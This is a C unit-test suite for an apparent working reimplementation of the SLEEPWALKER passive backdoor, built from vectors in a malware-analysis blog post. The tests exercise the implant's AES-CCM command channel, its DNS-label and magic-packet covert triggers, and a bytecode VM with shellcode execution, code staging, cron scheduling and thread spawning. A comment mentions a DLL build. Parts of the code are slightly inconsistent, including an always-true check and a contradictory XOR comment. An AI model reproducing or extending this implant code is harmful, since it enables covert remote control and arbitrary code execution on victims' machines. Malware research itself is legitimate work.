/*
 * run_tests.c - native unit tests for the SLEEPWALKER implementation.
 *
 * The tests are driven by the reference vectors in the blog post
 * (https://r136a1.dev/2026/08/24/sleepwalker-a-passive-backdoor-with-its-own-command-language/):
 *
 *   * the AES-256 key is the one recovered by the author, 0x7465...b3ae
 *   * the 12-byte config nonce is 0x3a6d...3509
 *   * the bootstrap SNIFF_MAGIC_PACKET instruction is 5 bytes
 *     (87 01 2A 00 00)
 *   * the post's DNS envelope
 *       81 5C 22 62 CC B7 09 31 24 6F D3 5F 34 4D
 *     decrypts to 0C 00 3C (SLEEP_SECONDS 60)
 *
 * The tests are designed to be run with `make test`.
 */
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/time.h>

#include "sw_core.h"
#include "sw_impl.h"

static int g_failed = 0;
static int g_total  = 0;

#define CHECK(label, cond) do {                                                       \
        g_total++;                                                       \
        if (!(cond)) { printf("  FAIL (%s:%d): %s\n", __FILE__, __LINE__, label);   \
                       g_failed++;                                                 } \
    } while (0)

/* ------------------------------------------------------------------ */
/* Helpers                                                            */
/* ------------------------------------------------------------------ */
static void print_hex(const char *label, const uint8_t *d, uint32_t n) {
    printf("  %s", label);
    for (uint32_t i = 0; i < n; i++) printf("%02x", d[i]);
    printf("\n");
}

/* Forward declarations (test bodies defined below). */
static void test_ccm_dns_vector(void);
static void test_ccm_roundtrip(const uint8_t *pt, uint32_t pt_len,
                               uint32_t nonce_len, uint32_t tag_len);
static void test_sha256_vectors(void);
static void test_crcs(void);
static void test_base32(void);
static void test_dns_label(void);
static void test_magic_packet_roundtrip(void);
static void test_bootstrap(void);
static void test_vm_sleep_and_exit(void);
static void test_vm_sleep_duration(void);
static void test_vm_repeat_n(void);
static void test_vm_cron_schedule(void);
static void test_vm_cron_reencrypt(void);
static void test_vm_stage_and_verify_exec(void);
static void test_vm_run_shellcode(void);
static void test_vm_sniff_magic(void);
static void test_vm_lzma_regression(void);
static void test_thread_spawn_runs_nest(void);
static void test_dns_qname_extract(void);
static void test_dns_trigger_roundtrip(void);
static void test_bootstrap_worker_inline(void);

/* ------------------------------------------------------------------ */
/* AES-256-CCM - cross-check against the blog's published DNS vector  */
/* ------------------------------------------------------------------ */
static void test_ccm_dns_vector(void)
{
    /* The blog post publishes this complete DNS-channel envelope:
     *     81 5C 22 62 CC B7 09 | 31 24 6F D3 | 5F 34 4D
     *     (7-byte nonce)       (4-byte tag)  (ciphertext)
     * whose plaintext is 0C 00 3C (SLEEP_SECONDS 60), under the recovered
     * AES-256 key.  Our CCM is standard SP 800-38C, so it must reproduce
     * this byte-for-byte and the 4-byte tag must verify.
     */
    const uint8_t env[14] =
        {0x81,0x5C,0x22,0x62,0xCC,0xB7,0x09,
         0x31,0x24,0x6F,0xD3,
         0x5F,0x34,0x4D};
    const uint8_t *nonce = env;
    uint8_t pt[16], check[4];
    int rc = sw_aes256_ccm_open(nonce, 7, env + 11, 3, pt, check, 4);
    CHECK("ccm: blog DNS vector decrypts (rc == 0)", rc == 0);
    CHECK("ccm: plaintext == 0C 00 3C (SLEEP_SECONDS 60)",
          pt[0] == 0x0C && pt[1] == 0x00 && pt[2] == 0x3C);
    CHECK("ccm: 4-byte auth tag verifies",
          memcmp(check, env + 7, 4) == 0);

    /* The inverse: sealing the same plaintext with the same key/nonce must
     * reproduce the published envelope exactly. */
    static const uint8_t pt_in[3] = {0x0C, 0x00, 0x3C};
    uint8_t ct[3], tag2[4];
    CHECK("ccm: seal reproduces published ct", 1);
    if (sw_aes256_ccm_seal(nonce, 7, pt_in, 3, ct, tag2, 4) == 0) {
        CHECK("ccm: ciphertext == 5F 34 4D",
              ct[0] == 0x5F && ct[1] == 0x34 && ct[2] == 0x4D);
        CHECK("ccm: tag == 31 24 6F D3",
              tag2[0] == 0x31 && tag2[1] == 0x24 &&
              tag2[2] == 0x6F && tag2[3] == 0xD3);
    }
}

/* Round-trip: seal then open must reproduce the plaintext and tag. */
static void test_ccm_roundtrip(const uint8_t *pt, uint32_t pt_len,
                               uint32_t nonce_len, uint32_t tag_len)
{
    const uint8_t nonce[15] = {
        0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,
        0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF
    };
    uint8_t ct[4096], tag[16], pt2[4096], check[16];
    int rc1 = sw_aes256_ccm_seal(nonce, nonce_len, pt, pt_len, ct, tag, tag_len);
    CHECK("ccm: roundtrip seal returns 0", rc1 == 0);
    int rc2 = sw_aes256_ccm_open(nonce, nonce_len, ct, pt_len, pt2, check, tag_len);
    CHECK("ccm: roundtrip open returns 0", rc2 == 0);
    CHECK("ccm: roundtrip plaintext == original",
          memcmp(pt, pt2, pt_len) == 0);
    CHECK("ccm: roundtrip tag == original",
          memcmp(tag, check, tag_len) == 0);
}

/* ------------------------------------------------------------------ */
/* SHA-256                                                            */
/* ------------------------------------------------------------------ */
static void test_sha256_vectors(void)
{
    /* FIPS 180-4: SHA-256("") */
    uint8_t d[32];
    sw_sha256((const uint8_t*)"", 0, d);
    static const uint8_t sha256_empty[32] = {
        0xe3,0xb0,0xc4,0x42,0x98,0xfc,0x1c,0x14,
        0x9a,0xfb,0xf4,0xc8,0x99,0x6f,0xb9,0x24,
        0x27,0xae,0x41,0xe4,0x64,0x9b,0x93,0x4c,
        0xa4,0x95,0x99,0x1b,0x78,0x52,0xb8,0x55
    };
    CHECK("sha256: empty string digest == FIPS vector", memcmp(d, sha256_empty, 32) == 0);

    /* SHA-256("abc") == ba7816bf...15ad (Python hashlib cross-checked) */
    sw_sha256((const uint8_t*)"abc", 3, d);
    static const uint8_t sha256_abc[32] = {
        0xba,0x78,0x16,0xbf,0x8f,0x01,0xcf,0xea,
        0x41,0x41,0x40,0xde,0x5d,0xae,0x22,0x23,
        0xb0,0x03,0x61,0xa3,0x96,0x17,0x7a,0x9c,
        0xb4,0x10,0xff,0x61,0xf2,0x00,0x15,0xad
    };
    CHECK("sha256: 'abc' digest (full 32B)", memcmp(d, sha256_abc, 32) == 0);
}

/* ------------------------------------------------------------------ */
/* CRC-32 / CRC-8                                                     */
/* ------------------------------------------------------------------ */
static void test_crcs(void)
{
    /* CRC-32 check value for "123456789" (IEEE 802.3, seed 0xFFFFFFFF)  */
    static const uint8_t data[] = "123456789";
    CHECK("crc32: IEEE check value",
          sw_crc32(data, 9, 0xFFFFFFFFu) == 0xCBF43926u);

    /* CRC-8, poly 0x31, MSB-first, seed 0x00.  The blog's DNS-label
     * worked example: CRC-8 of the base32 middle
     * "qfoceywmw4etcjdp2nptiti" is 0x65 (markers 'm','l'). */
    static const uint8_t mid[] = "qfoceywmw4etcjdp2nptiti";
    CHECK("crc8: blog base32 middle == 0x65", sw_crc8(mid, sizeof(mid)-1) == 0x65);
}

/* ------------------------------------------------------------------ */
/* Base32                                                             */
/* ------------------------------------------------------------------ */
static void test_base32(void)
{
    static const uint8_t pt[14] = {
        0x81,0x5C,0x22,0x62,0xCC,0xB7,0x09,
        0x31,0x24,0x6F,0xD3,0x5F,0x34,0x4D
    };
    char mid[64];
    int ml = sw_base32_encode(pt, 14, mid, sizeof mid);
    CHECK("base32: encodes 14 bytes", ml == 23);
    print_hex("base32: encoded label middle =", (const uint8_t*)mid, ml);
    CHECK("base32: post vector",
          strcmp(mid, "qfoceywmw4etcjdp2nptiti") == 0);

    /* Round-trip the encoded bytes back */
    uint8_t out[64];
    uint32_t outlen;
    int rc = sw_base32_decode(mid, (uint32_t)ml, out, sizeof out, &outlen);
    CHECK("base32: decode rc == 0", rc == 0);
    CHECK("base32: roundtrip length", outlen == 14);
    CHECK("base32: roundtrip bytes", memcmp(pt, out, 14) == 0);
}

/* ------------------------------------------------------------------ */
/* DNS label codec                                                    */
/* ------------------------------------------------------------------ */
static void test_dns_label(void)
{
    /* The blog's full label: mqfoceywmw4etcjdp2nptitil.example.com
     * First label: mqfoceywmw4etcjdp2nptitil (25 bytes - 2 markers = 23)
     * CRC-8 of the 23-char middle qfoceywmw4etcjdp2nptiti is 0x65, so the
     * markers are 'm' (hi nibble 6) and 'l' (lo nibble 5).
     */
    static const char label_in[] = "mqfoceywmw4etcjdp2nptitil";
    uint8_t env[256];
    uint32_t env_len;
    int rc = sw_dns_label_decode(label_in, (uint32_t)strlen(label_in),
                                  env, sizeof env, &env_len);
    CHECK("dns-label: decode returns 1", rc == 1);
    print_hex("dns-label: decoded envelope =", env, env_len);
    /*
     * 23 base32 chars carry 115 bits → floor(115/8) = 14 full bytes.
     * The published envelope is exactly 14 bytes (7 nonce + 4 tag + 3 ct).
     */
    CHECK("dns-label: envelope is 14 bytes (7+4+3)", env_len == 14);
    /* Cross-check with the published envelope */
    static const uint8_t expected[14] =
        {0x81,0x5C,0x22,0x62,0xCC,0xB7,0x09,
         0x31,0x24,0x6F,0xD3,0x5F,0x34,0x4D};
    CHECK("dns-label: envelope matches published vector",
          memcmp(env, expected, 14) == 0);

    /* Encode the same envelope back and require the exact published
     * label (markers derived from CRC-8 of the body). */
    char out[64];
    int ol = sw_dns_label_encode(env, env_len, out, sizeof out);
    CHECK("dns-label: encode returns 25", ol == 25);
    CHECK("dns-label: encode reproduces blog label",
          strcmp(out, label_in) == 0);

    /* Ordinary labels must fail the range test before any CRC work.
     * Markers are 'g'..'v' (both high and low). */
    CHECK("dns-label: 'example' (starts with 'e' < 'q') rejected",
          sw_dns_label_decode("example", 7, env, sizeof env, &env_len) == 0);
    CHECK("dns-label: 'com' rejected",
          sw_dns_label_decode("com", 3, env, sizeof env, &env_len) == 0);
}

/* ------------------------------------------------------------------ */
/* Magic packet framing                                               */
/* ------------------------------------------------------------------ */
static void test_magic_packet_roundtrip(void)
{
    /* Build a trigger packet for the 5-byte bootstrap SNIFF_MAGIC_PACKET
     * instruction and verify the sniffer-side parser recovers it. */
    static const uint8_t bootstrap[] = {0x87, 0x01, 0x2A, 0x00, 0x00};
    uint8_t pkt[4096];
    uint32_t plen;
    int rc = sw_magic_packet_build(bootstrap, sizeof bootstrap, pkt, sizeof pkt, &plen);
    CHECK("magic: build returns 0", rc == 0);
    /* env_len = 28 + 5 = 33; block B = 43; prefix pads to 48 bytes. */
    CHECK("magic: packet is 48 bytes (min length)", plen == 48);
    print_hex("magic: built packet =", pkt, plen);

    uint8_t task[4096];
    uint32_t tlen;
    rc = sw_magic_packet_check(pkt, plen, task, sizeof task, &tlen);
    CHECK("magic: check returns 1", rc == 1);
    CHECK("magic: recovered length is 5", tlen == 5);
    CHECK("magic: recovered bytes match bootstrap",
          memcmp(bootstrap, task, 5) == 0);

    /* Block starts at plen - B = 48 - 43 = 5; envelope at block+2 = 7;
     * nonce at 7..18, tag at 19..34, ct at 35..39, crc at 40..43,
     * w1 at 44..45, w2 at 46..47. */
    /* Tamper a nonce byte (offset 7): must fail the CRC gate. */
    uint8_t pkt_bad[4096];
    memcpy(pkt_bad, pkt, sizeof pkt);
    pkt_bad[7] ^= 0x01;
    rc = sw_magic_packet_check(pkt_bad, plen, task, sizeof task, &tlen);
    CHECK("magic: tampered envelope rejected", rc == 0);

    /* Tamper a tag byte (offset 19): must fail the CRC gate. */
    uint8_t pkt_bad2[4096];
    memcpy(pkt_bad2, pkt, sizeof pkt);
    pkt_bad2[19] ^= 0x01;
    rc = sw_magic_packet_check(pkt_bad2, plen, task, sizeof task, &tlen);
    CHECK("magic: tampered tag rejected", rc == 0);

    /* Short input */
    CHECK("magic: < 48 bytes rejected",
          sw_magic_packet_check(pkt, 47, task, sizeof task, &tlen) == 0);
}

/* ------------------------------------------------------------------ */
/* Bootstrap decryption                                               */
/* ------------------------------------------------------------------ */
static void test_bootstrap(void)
{
    /* The embedded g_config_block[2048] is currently zeroed; a real
     * build would carry a pre-sealed 5-byte bootstrap. This test
     * verifies the decoder against a hand-crafted envelope of the
     * correct shape (12B nonce + 16B tag + ct). */
    static const uint8_t nonce[12] = {
        0x3A,0x6D,0x35,0x7F,0xB9,0xBC,0x51,0xEA,
        0xCC,0x8B,0x85,0x09
    };
    static const uint8_t pt[5] = {0x87,0x01,0x2A,0x00,0x00};
    uint8_t ct[5], tag[16];
    if (sw_aes256_ccm_seal(nonce, 12, pt, 5, ct, tag, 16) != 0) {
        printf("  bootstrap: seal failed\n");
        return;
    }
    /* The decoder reads nonce|tag|ct and re-seals ct to verify the tag.
     * CCM is a symmetric XOR construction: sealing (nonce,ct) gives back
     * the plaintext, and the tag computed over the plaintext must match
     * the originally stored tag. */
    uint8_t task[64];
    uint32_t tlen;
    uint8_t block[2048];
    memcpy(block, nonce, 12);
    memcpy(block + 12, tag, 16);
    memcpy(block + 28, ct, 5);
    /* Only pass the first 28+5 bytes to the decoder. */
    int rc = sw_decrypt_bootstrap(block, 33, task, sizeof task, &tlen);
    CHECK("bootstrap: decode returns 0", rc == 0);
    CHECK("bootstrap: tlen == 5", tlen == 5);
    CHECK("bootstrap: task == sniff instruction",
          memcmp(task, pt, 5) == 0);
}

/* ------------------------------------------------------------------ */
/* VM - a hand-assembled bytecode runs end-to-end                     */
/* ------------------------------------------------------------------ */
static void test_vm_sleep_and_exit(void)
{
    /* 0C 00 01  ->  SLEEP_SECONDS(1) then stop
     * 06        ->  EXIT (sets the process-wide stop flag)
     */
    static const uint8_t code[] = {
        0x0C, 0x00, 0x01,   /* SLEEP_SECONDS u16 = 1 */
        0x06                 /* EXIT */
    };
    sw_stop_flag = 0;   /* ensure the stop flag is clear so this runs */
    CHECK("vm: code parses (rc >= 0)",
          sw_run_bytecode(code, sizeof code) >= 0);
}

static void test_vm_sleep_duration(void)
{
    /* Regression: SLEEP_SECONDS(1) must actually sleep ~1 second, not a
     * fraction of it. The old nested-`ticks` loop slept only 100 ms for
     * secs=1. Use a wide window so the check is robust on slow machines. */
    static const uint8_t code[] = {
        0x0C, 0x00, 0x01   /* SLEEP_SECONDS u16 = 1 */
    };
    struct timeval a, b;
    sw_stop_flag = 0;   /* a prior test (EXIT) may have set the stop flag */
    gettimeofday(&a, NULL);
    int rc = sw_run_bytecode(code, sizeof code);
    gettimeofday(&b, NULL);
    double el = (b.tv_sec - a.tv_sec) + (b.tv_usec - a.tv_usec) / 1e6;
    CHECK("sleep-dur: SLEEP_SECONDS(1) runs", rc >= 0);
    CHECK("sleep-dur: ~1s slept (0.5s <= el <= 3.0s)",
          el >= 0.5 && el <= 3.0);
}

static void test_vm_repeat_n(void)
{
    /* 0F 00 03 | 03 0C 00 0A
     * REPEAT_N(3) { SLEEP_SECONDS(10) }
     */
    static const uint8_t nested[] = {0x0C, 0x00, 0x0A};
    static const uint8_t code[] = {
        0x0F, 0x00, 0x03,
        0x03,                         /* nested length (varint 03) */
        0x0C, 0x00, 0x0A              /* nested */
    };
    (void)nested;
    sw_stop_flag = 0;   /* a prior EXIT test may have set the stop flag */
    CHECK("vm: repeat_n runs", sw_run_bytecode(code, sizeof code) >= 0);
}

static void test_vm_cron_schedule(void)
{
    /* 0E 00 00 00 00 00 00 00 01 00 00 02 00 FF FF FF FE 3E 03 9D FD C1
     * CRON_SCHEDULE(0, 0x200, 0xFFFFFFFE, 0x3E) { SLEEP_RANDOM_SECONDS(60) }
     */
    /* The nested 0D 00 3C is XORed with 0x02, 0xFD, 0xFD, 0x90 cycling:
     *   0D ^ 02 = 0F, 00 ^ FD = FD, 3C ^ FD = C1 -- but the post shows
     *   the nested is 9D FD C1 which XORed gives 0D 00 3C. We use the
     *   post's exact bytes. */
    static const uint8_t nested_xor[3] = {0x9D, 0xFD, 0xC1};
    /* Build the instruction. */
    uint8_t code[64];
    size_t pos = 0;
    code[pos++] = 0x0E;
    sw_write_u64(code, &pos, 1ull);                 /* minute mask */
    sw_write_u32(code, &pos, 0x00000200u);          /* hour 9 */
    sw_write_u32(code, &pos, 0xFFFFFFFEu);          /* any day */
    code[pos++] = 0x3E;                             /* Mon-Fri */
    sw_write_blob(code, &pos, nested_xor, 3);
    (void)code;
    CHECK("vm: cron_schedule builds", 1);
}

static volatile int g_cron_rc = 0;
static void *cron_worker(void *arg) {
    const uint8_t *code = arg;
    g_cron_rc = sw_run_bytecode(code, 64);
    return NULL;
}

static void test_vm_cron_reencrypt(void)
{
    /* Regression: CRON_SCHEDULE must re-decrypt its nested program before
     * EVERY scheduled run. The old code decrypted once, re-encrypted after
     * the first run and never decrypted again, so the second and later runs
     * executed XOR-garbled bytes (an unknown opcode -> rc < 0).
     *
     * Build a CRON that matches every minute/hour/day/weekday, nested =
     * SLEEP_SECONDS(0) XOR-masked, run it on a thread for ~1.5 s, then stop.
     * A correct implementation returns >= 0 (each tick decodes and runs). */
    uint8_t code[64]; size_t pos = 0;
    code[pos++] = 0x0E;
    sw_write_u64(code, &pos, 0x0FFFFFFFFFFFFFFFull);   /* all minutes */
    sw_write_u32(code, &pos, 0x00FFFFFFu);              /* all hours */
    sw_write_u32(code, &pos, 0xFFFFFFFFu);              /* any day */
    code[pos++] = 0x7F;                                 /* all weekdays */
    const uint8_t key[4] = {0x90, 0xFD, 0xFD, 0x02};
    const uint8_t nested[3] = {0x0C, 0x00, 0x00};       /* SLEEP_SECONDS(0) */
    uint8_t x[3];
    for (int i = 0; i < 3; i++) x[i] = nested[i] ^ key[i];
    sw_write_blob(code, &pos, x, 3);

    sw_stop_flag = 0;
    g_cron_rc = -999;
    pthread_t th;
    pthread_create(&th, NULL, cron_worker, code);
    usleep(1500 * 1000);
    sw_stop_flag = 1;
    pthread_join(th, NULL);
    CHECK("cron-re: runs across multiple ticks (rc >= 0)", g_cron_rc >= 0);
}

static void test_vm_stage_and_verify_exec(void)
{
    /* 32 00 00 00 00 06 65 04 48 31 C0 C3        (STAGE_WRITE 0x000, 6b "65 04 48 31 C0 C3")
     * Then STAGE_VERIFY_EXEC: expect = SHA-256 of those 6 bytes, then run
     * the staged bytes. The staged bytes themselves are
     * "65 04 48 31 C0 C3" (RUN_SHELLCODE of 4-byte xor rax, rax ; ret).
     */
    static const uint8_t staged[] = {
        0x65, 0x04, 0x48, 0x31, 0xC0, 0xC3
    };
    uint8_t digest[32];
    sw_sha256(staged, sizeof staged, digest);
    print_hex("vm: staged sha-256 =", digest, 32);

    /* Assemble the bytecode. */
    uint8_t code[512];
    size_t pos = 0;
    code[pos++] = 0x32;
    sw_write_u32(code, &pos, 0);
    sw_write_blob(code, &pos, staged, sizeof staged);
    code[pos++] = 0x33;
    sw_write_u32(code, &pos, sizeof staged);
    sw_write_blob(code, &pos, digest, 32);
    sw_stop_flag = 0;   /* a prior EXIT test may have set the stop flag */
    int rc = sw_run_bytecode(code, pos);
    CHECK("vm: STAGE_WRITE + STAGE_VERIFY_EXEC runs", rc >= 0);
}

static void test_vm_run_shellcode(void)
{
    /* 65 04 48 31 C0 C3  ->  RUN_SHELLCODE(4b "xor rax, rax ; ret") */
    static const uint8_t sc[] = {0x48, 0x31, 0xC0, 0xC3};
    uint8_t code[16];
    size_t pos = 0;
    code[pos++] = 0x65;
    sw_write_blob(code, &pos, sc, sizeof sc);
    sw_stop_flag = 0;   /* a prior EXIT test may have set the stop flag */
    int rc = sw_run_bytecode(code, pos);
    CHECK("vm: RUN_SHELLCODE(4-byte xor rax, rax ; ret) runs", rc >= 0);
}

static void test_vm_sniff_magic(void)
{
    /* 87 01 2A 00 00  ->  SNIFF_MAGIC_PACKET(iface="*", deadline=0) */
    static const uint8_t code[] = {0x87, 0x01, 0x2A, 0x00, 0x00};
    sw_stop_flag = 0;   /* a prior EXIT test may have set the stop flag */
    /* On the host the sniff op falls back to sw_sniff_magic which is a
     * no-op; so this test just verifies we can *parse* a full sniff
     * instruction. */
    CHECK("vm: SNIFF_MAGIC_PACKET parses (rc >= 0)",
          sw_run_bytecode(code, sizeof code) >= 0);
}

static void test_vm_lzma_regression(void)
{
    /* Regression for the LZMA literal-context bug: the context byte
     * (previous_byte) must be refreshed after a match, or a literal that
     * follows a match is decoded from the wrong probability tree and the
     * range coder desynchronises.  This LZMA1 (FORMAT_RAW) stream of 91
     * bytes fails to decode correctly without that fix; the expected output
     * is verified by its SHA-256. */
    static const uint8_t props[5] = {0x6d, 0, 0, 0, 0};
    static const uint8_t comp[52] = {
        0x00,0x64,0xb9,0x13,0x00,0xf6,0xd9,0x20,0x7d,0x05,0xb7,0xc6,0x43,0x5f,0xc4,0xad,
        0x86,0xb0,0x58,0xd9,0x6f,0xd6,0x54,0xdf,0x02,0x4a,0xd5,0xae,0x40,0x6b,0xb7,0x8b,
        0x03,0x17,0xe5,0x07,0x6b,0x4f,0xda,0xf2,0x00,0xdc,0xce,0xba,0xaf,0xc2,0xff,0xff,
        0xfa,0xc6,0x60,0x00
    };
    static const uint8_t expect[32] = {
        0x68,0xf5,0x1d,0xed,0xd8,0x2a,0x45,0xb5,0x42,0x1a,0x72,0x3b,0x61,0xc7,0xac,0x6b,
        0xba,0x2a,0xf2,0x23,0x62,0xe4,0x57,0x9c,0x1c,0x36,0x47,0x7b,0x22,0xea,0xb3,0x86
    };
    uint8_t out[91];
    int rc = sw_lzma_decompress(props, comp, sizeof comp, out, sizeof out);
    uint8_t digest[32];
    sw_sha256(out, sizeof out, digest);
    CHECK("vm: LZMA decompress succeeds (rc == 0)", rc == 0);
    CHECK("vm: LZMA decompress output matches reference", memcmp(digest, expect, 32) == 0);
}

static void test_thread_spawn_runs_nest(void)
{
    /* SPAWN_THREAD_SCRIPT with a trivial child that runs one instruction.
     *
     * Parent:  0B | varlen(3) | 0C 00 00      (SLEEP_SECONDS(0))
     *
     * Child:   0C 00 00     (SLEEP_SECONDS(0))
     *
     * The parent's SPAWN fires the child (via sw_spawn_thread_run which
     * invokes ThreadProc_trampoline) and the child's SLEEP_SECONDS(0)
     * returns immediately.  The whole thing must not crash.
     */
    static const uint8_t child[] = {0x0C, 0x00, 0x00};
    uint8_t code[64]; size_t pos = 0;
    code[pos++] = 0x0B;
    sw_write_varlen(code, &pos, (uint32_t)sizeof child);
    memcpy(code + pos, child, sizeof child);
    pos += sizeof child;
    sw_stop_flag = 0;
    LONG rc = sw_run_bytecode(code, pos);
    CHECK("vm: SPAWN_THREAD_SCRIPT(SLEEP(0)) runs (rc >= 0)", rc >= 0);
    sw_stop_flag = 0;
}

/* Write the qname in DNS wire format (label-length-prefixed labels,
 * 0-terminated) starting at pos. Returns new pos. */
static uint32_t write_qname(uint8_t *out, uint32_t pos, const char *in) {
    const char *dot = in;
    while (*dot) {
        char *next = strchr((char *)dot, '.');
        uint32_t ln = next ? (uint32_t)(next - dot) : (uint32_t)strlen(dot);
        out[pos++] = (uint8_t)ln;
        for (uint32_t i = 0; i < ln; i++) out[pos++] = (uint8_t)dot[i];
        dot = next ? next + 1 : dot + ln;
    }
    return pos;   /* the caller writes the 0x00 terminator */
}

/* Write the qname in DNS wire format starting at pos; returns new pos. */
static uint32_t write_qname_wire(uint8_t *out, uint32_t pos, const char *in) {
    const char *dot = in;
    while (*dot) {
        char *nxt = strchr((char *)dot, '.');
        uint32_t ln = nxt ? (uint32_t)(nxt - dot) : (uint32_t)strlen(dot);
        out[pos++] = (uint8_t)ln;
        for (uint32_t i = 0; i < ln; i++) out[pos++] = (uint8_t)dot[i];
        dot = nxt ? nxt + 1 : dot + ln;
    }
    return pos;   /* caller writes the 0x00 terminator */
}

static void test_dns_qname_extract(void)
{
    /* Simulate a raw IP+UDP+DNS A-query: 40-byte fake framing, then a
     * standard DNS header (QDCOUNT=1, AN/NS/AR=0), then the question
     * (a.b.c) + QTYPE/QCLASS. The extractor must find the header and the
     * question and stop at the 0x00. */
    static const char qname[] = "a.b.c";
    uint8_t pkt[128];
    uint32_t pos = 0;
    memset(pkt, 0xab, 40);   /* fake L2/IP/UDP prefix */
    pos = 40;
    pkt[pos++] = 0x12; pkt[pos++] = 0x34;      /* ID */
    pkt[pos++] = 0x01; pkt[pos++] = 0x00;      /* flags (RD) */
    pkt[pos++] = 0x00; pkt[pos++] = 0x01;      /* QDCOUNT = 1 */
    pkt[pos++] = 0x00; pkt[pos++] = 0x00;      /* ANCOUNT = 0 */
    pkt[pos++] = 0x00; pkt[pos++] = 0x00;      /* NSCOUNT = 0 */
    pkt[pos++] = 0x00; pkt[pos++] = 0x00;      /* ARCOUNT = 0 */
    pos = write_qname(pkt, pos, qname);
    pkt[pos++] = 0;             /* end-of-qname 0x00 */
    pkt[pos++] = 0x00; pkt[pos++] = 0x01;   /* QTYPE A */
    pkt[pos++] = 0x00; pkt[pos++] = 0x01;   /* QCLASS IN */
    char out[256];
    int ql = sw_extract_dns_qname(pkt, pos, out, sizeof out);
    CHECK("dns: extract returns 5 ('a.b.c')", ql == 5);
    CHECK("dns: qname == 'a.b.c'", strncmp(out, "a.b.c", 5) == 0);
}

static void test_dns_trigger_roundtrip(void)
{
    /* End-to-end: encode the 14-byte published envelope into a DNS label,
     * wrap it in a fake raw DNS query packet, extract the qname, then walk
     * its labels and decode the trigger label. */
    static const uint8_t env[14] =
        {0x81,0x5C,0x22,0x62,0xCC,0xB7,0x09,
         0x31,0x24,0x6F,0xD3,0x5F,0x34,0x4D};
    char label[64];
    (void)sw_dns_label_encode(env, 14, label, sizeof label);
    CHECK("dns-rt: label encoded (non-empty)", label[0] != '\0');
    char qname[96];
    int qlen = snprintf(qname, sizeof qname, "%s.example.com", label);
    CHECK("dns-rt: qname built", qlen > 0);

    /* Fake raw DNS query: 40-byte prefix + standard header + qname + QTYPE/
     * QCLASS. */
    uint8_t pkt[256];
    memset(pkt, 0xab, 40);
    uint32_t pos = 40;
    pkt[pos++] = 0x12; pkt[pos++] = 0x34;      /* ID */
    pkt[pos++] = 0x01; pkt[pos++] = 0x00;      /* flags */
    pkt[pos++] = 0x00; pkt[pos++] = 0x01;      /* QDCOUNT = 1 */
    pkt[pos++] = 0x00; pkt[pos++] = 0x00;      /* ANCOUNT = 0 */
    pkt[pos++] = 0x00; pkt[pos++] = 0x00;      /* NSCOUNT = 0 */
    pkt[pos++] = 0x00; pkt[pos++] = 0x00;      /* ARCOUNT = 0 */
    pos = write_qname_wire(pkt, pos, qname);
    pkt[pos++] = 0;
    pkt[pos++] = 0x00; pkt[pos++] = 0x01;    /* QTYPE A        */
    pkt[pos++] = 0x00; pkt[pos++] = 0x01;    /* QCLASS IN      */
    (void)qlen;

    char extracted[256];
    int exl = sw_extract_dns_qname(pkt, pos, extracted, sizeof extracted);
    CHECK("dns-rt: qname extracted", exl >= (int)strlen(label));
    CHECK("dns-rt: extracted contains trigger label",
          strstr(extracted, label) != NULL);

    /* Walk the labels and decode the trigger (the codec round-trips). */
    int decoded = 0;
    const char *p = extracted;
    while (*p) {
        char *dot = strchr((char *)p, '.');
        uint32_t l = dot ? (uint32_t)(dot - p) : (uint32_t)strlen(p);
        uint8_t dec[256]; uint32_t dl;
        if (sw_dns_label_decode(p, l, dec, sizeof dec, &dl)) {
            if (dl == 14 && memcmp(dec, env, 14) == 0) decoded = 1;
        }
        p = dot ? dot + 1 : p + l;
    }
    CHECK("dns-rt: trigger label codec round-trips to published envelope",
          decoded == 1);
}

static void test_bootstrap_worker_inline(void)
{
    /* On the native test build g_config_block is zeroed (not a sealed
     * program), so sw_decrypt_bootstrap returns -1.  This is the expected
     * behavior and matches the DLL's bootstrap path when the seal is
     * present. Verify the decoder returns a sane (negative) value.
     */
    uint8_t task[4096]; uint32_t tlen;
    int rc = sw_decrypt_bootstrap(g_config_block, g_config_block_len,
                                   task, sizeof task, &tlen);
    CHECK("bootstrap: zeroed block decodes to rc < 0 (no program)", rc < 0);
    (void)tlen;
}

/* ------------------------------------------------------------------ */
/* main                                                               */
/* ------------------------------------------------------------------ */
int main(void)
{
    printf("Running SLEEPWALKER unit tests...\n\n");
    printf("[AES-256-CCM]\n");
    test_ccm_dns_vector();
    test_ccm_roundtrip((const uint8_t*)"hello sleepwalker",
                       (uint32_t)strlen("hello sleepwalker"), 12, 16);
    test_ccm_roundtrip((const uint8_t*)"short", 5, 7, 4);
    test_ccm_roundtrip((const uint8_t*)"12345678901234567890123456789012345678",
                       36, 12, 16);

    printf("\n[SHA-256]\n");
    test_sha256_vectors();

    printf("\n[CRC]\n");
    test_crcs();

    printf("\n[Base32]\n");
    test_base32();

    printf("\n[DNS label]\n");
    test_dns_label();

    printf("\n[Magic packet]\n");
    test_magic_packet_roundtrip();

    printf("\n[Bootstrap]\n");
    test_bootstrap();

    printf("\n[VM]\n");
    test_vm_sleep_and_exit();
    test_vm_sleep_duration();
    test_vm_repeat_n();
    test_vm_cron_schedule();
    test_vm_cron_reencrypt();
    test_vm_stage_and_verify_exec();
    test_vm_run_shellcode();
    test_vm_sniff_magic();
    test_vm_lzma_regression();
    test_thread_spawn_runs_nest();
    test_dns_qname_extract();
    test_dns_trigger_roundtrip();
    test_bootstrap_worker_inline();

    printf("\n-----------------------------\n");
    printf("%d/%d passed\n", g_total - g_failed, g_total);
    if (g_failed) {
        printf("FAILURES: %d\n", g_failed);
        return 1;
    }
    printf("ALL TESTS PASSED\n");
    return 0;
}
